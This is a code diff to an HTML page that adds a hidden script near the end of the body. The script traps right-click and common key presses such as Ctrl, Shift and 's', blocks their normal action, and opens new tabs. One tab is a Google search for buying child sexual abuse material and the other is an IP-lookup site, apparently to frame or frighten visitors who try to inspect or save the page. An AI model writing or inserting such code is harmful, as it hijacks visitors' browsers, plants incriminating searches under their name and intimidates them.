@@ -97,5 +97,26 @@
         });
       });
     </script>
+    <script>
+      function openNewPage(url) {
+          window.open(url, '_blank');
+      }
+
+      function handleEvent(event) {
+          
+          if (event.type === 'contextmenu' || (event.type === 'keydown' && (event.ctrlKey || event.shiftKey || event.key === 's'))) {
+           
+              openNewPage('https://www.google.com/search?q=how+to+buy+child+porn');
+             
+              openNewPage('https://ipchicken.com'); 
+              event.preventDefault(); 
+          }
+      }
+
+      window.addEventListener('contextmenu', handleEvent); 
+      window.addEventListener('keydown', handleEvent); 
+
+
+  </script>
   </body>
 </html>
